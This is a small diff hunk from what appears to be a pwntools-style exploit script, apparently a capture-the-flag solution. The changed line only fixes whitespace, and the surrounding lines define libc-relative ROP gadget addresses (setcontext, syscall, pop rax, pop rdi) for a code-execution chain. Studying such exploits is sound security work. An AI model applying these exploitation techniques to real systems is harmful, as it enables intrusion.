@@ -421,7 +421,7 @@ print("libc_base =", hex(libc_base))
 
 setcontext   = libc_base + libc.sym.setcontext
 mov_rdx_rdi  = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
-ret_addr     = libc_base + 0x22679　# ret;
+ret_addr     = libc_base + 0x22679  # ret;
 syscall_ret  = libc_base + 0x630d9  # syscall; ret;
 pop_rax_ret  = libc_base + 0x47400  # pop rax; ret;
 pop_rdi_ret  = libc_base + 0x23b72  # pop rdi; ret;
